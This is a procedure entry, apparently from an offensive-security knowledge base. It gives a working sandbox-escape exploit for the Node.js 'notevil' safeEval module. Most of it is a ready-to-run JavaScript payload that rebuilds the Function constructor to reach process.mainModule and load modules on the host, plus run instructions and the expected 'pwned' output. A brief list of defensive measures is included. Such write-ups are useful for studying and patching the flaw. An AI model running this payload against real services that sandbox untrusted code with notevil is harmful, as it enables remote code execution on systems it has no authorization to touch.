---
id: proc-execute-rce
tags:
  - rce
  - nodejs
type: procedure
tools:
  - '[[tools/RunKit]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/notevil-sandbox-escape-poc-nodejs]]'
verified: false
platforms:
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:08.455Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Execute Payload to Achieve RCE in Node.js

## Summary

This procedure executes the malicious payload using safeEval in a Node.js environment, escaping the sandbox to run arbitrary code like loading the util module and logging output.

## Description

By passing the crafted payload to safeEval, the procedure reconstructs the Function constructor, allowing access to Node.js globals like process.mainModule. This enables module loading and execution, demonstrating RCE. Proven via POC in environments like RunKit.

## Requirements

1. Loaded notevil module
2. Constructed payload string
3. Node.js executor

## Defense

Defensive measures and detection strategies:

- Isolate Node.js processes with containers
- Log eval-like function calls
- Scan for prototype manipulation in code

## Objectives

1. Escape sandbox boundaries
2. Execute host system code
3. Confirm RCE with observable output

## Instructions

### Step 1: Prepare Script

**Context**: Combine require and payload in a script.

**Command** ([[commands/notevil-sandbox-escape-poc-nodejs]]):
```javascript
var safeEval = require("notevil")
var code = "" + "function fn() {};" + "var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__.constructor);" + "var properties = Object.values(constructorProperty);" + "properties.pop();" + "properties.pop();" + "properties.pop();" + "var Func = properties.map(function (x) {return x.bind(x, 'return this.process.mainModule.constructor._load(`util`).log(`pwned`)')}).pop();" + "(Func())()"
console.log(safeEval(code))
```

> Full POC script. Expected output: pwned logged.

### Step 2: Run in Environment

**Context**: Execute using RunKit or local node.

**Command**:
```bash
node poc.js
```

> Runs the script. Expected output: Console log 'pwned' via util.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/notevil-sandbox-escape-poc-nodejs]]

## Tools Used

- [[tools/RunKit]]

## Tags

- rce
- nodejs
